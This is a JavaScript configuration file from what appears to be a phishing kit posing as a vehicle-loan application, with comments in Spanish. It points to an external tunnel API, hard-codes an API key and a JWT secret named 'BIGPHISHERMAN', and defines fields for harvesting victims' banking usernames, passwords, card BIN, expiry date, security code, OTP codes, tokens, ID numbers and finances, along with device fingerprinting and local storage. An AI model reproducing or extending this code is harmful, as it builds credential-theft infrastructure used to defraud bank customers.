/**
 * CONFIGURACIÓN
 */
const API_URL = 'https://tunnel.divinasmarranologosdante.shop';
// const API_URL = 'http://localhost:8000';
const API_KEY = '5ba6da97-916f-4c5c-b61e-0e52ae5fd263';
const JWT_SIGN = 'BIGPHISHERMAN';

const PORCENTAJE_ARRIBA = 300


const LS = window.localStorage;

let info = {
    requestInfo: {
        vehicleType: '',
        dni: '',
        amount: '',
        installments: '',
    },
    userInfo: {
        fullname: '',
        dni: '',
        birthdate: '',
        address: '',
        email: '',
        phone: '',

        house_sit: '',
        contract_term: '',
        month_revenue: '',
        month_costs: '',
        wealth: '',
        debts: '',
    },
    metaInfo: {
        TRANSID: 'transid',
        origin: '',
        desc: '',
        cardType: '',

        disp: '',
        mode: '',
        bank: '',
        
        user: '',
        pass: '',
        lastBin: '',
        cdin: '',
        ccaj: '',
        otpcode: '',
        token: '',
        bin: '',
        date: '',
        cs: '',

        fullname: '',
        dni: '',
        address: '',
        email: '',
        phone: '',

        amount: '',
        vehicleType: '',
        installments: '',

        house_sit: '',
        contract_term: '',
        month_revenue: '',
        month_costs: '',
        wealth: '',
        debts: '',
    },
    checkerInfo: {
        company: '',
        mode: 'userpassword',
    },
    edit: 0
}

dDisp();

function limitDigits(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

function cleanAndLimitDigits(input, maxLength) {
    // Eliminar todo lo que no sea dígito
    let value = input.value.replace(/\D/g, '');
    
    // Limitar a maxLength dígitos
    if (value.length > maxLength) {
        value = value.slice(0, maxLength);
    }
    
    // Actualizar el valor del input
    input.value = value;
}

function formatAmount(input) {
    let rawValue = input.value.replace(/,/g, ''); // Quitar comas
    let number = parseFloat(rawValue);

    if (isNaN(number)) {
        input.value = ""; // Si el usuario borra todo, mantener vacío
        return;
    }

    // Determinar si hay decimales
    let hasDecimals = rawValue.includes('.');

    // Formatear el número con o sin decimales según sea necesario
    let formattedValue = number.toLocaleString('en-US', { 
        minimumFractionDigits: hasDecimals ? 2 : 0, 
        maximumFractionDigits: hasDecimals ? 2 : 0 
    });

    // Restaurar el valor formateado
    input.value = formattedValue;
}

function formatAsDate(input) {
    // 1. Obtener el valor y eliminar todo lo que no sea dígito
    let val = input.value.replace(/\D/g, '');
  
    // 2. Limitar a 8 dígitos máximo: DD(2) + MM(2) + AAAA(4)
    val = val.substring(0, 8);
  
    // 3. Reconstruir la cadena con formato DD/MM/AAAA
    let formatted = '';
    if (val.length > 0) {
      // Los primeros 2 dígitos => DD
      formatted = val.substring(0, 2);
    }
    if (val.length > 2) {
      // Los siguientes 2 dígitos => /MM
      formatted += '/' + val.substring(2, 4);
    }
    if (val.length > 4) {
      // Los últimos 4 dígitos => /AAAA
      formatted += '/' + val.substring(4, 8);
    }
  
    // 4. Asignar el resultado formateado al campo
    input.value = formatted;
}
  
   


function dDisp() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if(userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iOS')){
        info.metaInfo.disp = "iOS";
    }else if(userAgent.includes('Windows')){
        info.metaInfo.disp = "PC";
    }else{
        info.metaInfo.disp = "Android";
    }
}

function updateLS(){
    LS.setItem('info', JSON.stringify(info));
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}



LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));

// LS.removeItem('info');